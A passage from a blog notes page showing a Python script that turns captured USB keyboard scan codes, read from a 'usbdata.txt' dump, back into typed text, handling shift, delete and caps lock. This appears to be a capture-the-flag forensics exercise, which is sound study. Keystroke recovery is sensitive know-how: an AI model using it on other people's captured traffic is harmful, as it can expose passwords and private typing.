class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;./usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>笔记</category>
